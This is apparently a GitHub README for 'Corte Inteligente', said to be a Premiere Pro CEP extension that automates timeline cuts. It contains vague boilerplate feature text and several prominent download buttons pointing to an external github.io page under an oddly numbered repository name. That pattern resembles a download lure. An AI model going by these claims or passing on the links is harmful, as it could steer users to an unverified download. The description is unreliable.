# Corte Inteligente v2026 - Adobe Premiere Pro extension 2026

> **Corte Inteligente is a native Adobe Premiere Pro panel extension that uses HTML, JavaScript, and ExtendScript to automate timeline editing tasks in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Adobe%20Premiere%20Pro-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/marcweiss92/corteinteligente-win-17818?style=flat-square)](https://github.com/marcweiss92/corteinteligente-win-17818)

---

<p align="center">
  <a href="https://marcweiss92.github.io/corteinteligente-win-17818/">
    <img src="https://img.shields.io/badge/Download-Corte%20Inteligente%20Latest-brightgreen?style=for-the-badge" alt="Download Corte Inteligente">
  </a>
</p>

> **[Direct Download - Corte Inteligente v2026](https://marcweiss92.github.io/corteinteligente-win-17818/)**

---

[Download Latest Build](https://marcweiss92.github.io/corteinteligente-win-17818/)

---

## About Corte Inteligente

Corte Inteligente is built for Premiere Pro workflows that need faster, more structured editing actions inside the timeline. It combines a Chromium-based HTML interface with JavaScript and ExtendScript so editing commands can be triggered from a native panel instead of relying only on manual steps.

The extension is useful for editors who want to automate repetitive cut-related operations, work with timeline changes more consistently, and keep editing controls close to the application. Its panel-based design makes it easier to interact with Premiere Pro while keeping the editing experience inside the familiar desktop environment.

---

## Features

- Automates video editing cuts inside Adobe Premiere Pro
- Performs dynamic timeline operations for editing workflows
- Includes native panel integration for a more direct workspace
- Uses ExtendScript to communicate with Premiere Pro
- Ships with an HTML, JavaScript, and CSS frontend
- Supports timeline automation patterns such as ripple delete
- Designed as a CEP extension for panel-based use
- Keeps editing controls accessible from within the app

---

## Installation

1. Download or clone this repository.
2. Place the extension folder in your Premiere Pro CEP extensions directory.
3. Launch Adobe Premiere Pro and open the extension panel from the available menus.

If your setup uses a custom CEP path, install it in the location expected by your system and Adobe configuration before starting the application.

---

## Usage

Open the Corte Inteligente panel inside Premiere Pro and use it to trigger supported editing actions.

Typical workflow:

1. Load a project in Premiere Pro.
2. Open the extension panel.
3. Select or prepare the timeline region you want to edit.
4. Run the available automation action from the panel.
5. Review the timeline result and continue editing as needed.

Because the extension bridges the UI with ExtendScript, actions are intended to be launched from the panel while Premiere Pro remains open.

---

## Configuration

Configuration details depend on how the extension is packaged in your local CEP setup. In most cases, panel settings and script behavior are managed through the extension files themselves.

Example structure:

    {
      "panel": "Corte Inteligente",
      "runtime": "Chromium-based HTML/JS UI",
      "bridge": "ExtendScript"
    }

If you customize behavior, keep the panel files and Premiere Pro integration points aligned with your local installation.

---

## Requirements

- Adobe Premiere Pro
- CEP extension support
- HTML, JavaScript, and ExtendScript runtime components
- A compatible desktop environment for panel-based extensions
- Storage space for the extension files and related assets

---

## FAQ

### Does this work inside Premiere Pro?
Yes. Corte Inteligente is designed as a panel extension for Adobe Premiere Pro.

### What technologies does it use?
It uses HTML, JavaScript, CSS, and ExtendScript, with CEP-based integration.

### Where do I change settings?
Check the extension files and any panel configuration included with your local installation.

### What if the panel does not appear?
Confirm that the extension is installed in the correct CEP directory and that Premiere Pro was restarted after installation.

### How are updates handled?
Updates depend on the repository release or build you are using. Check this repository for the latest available version.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
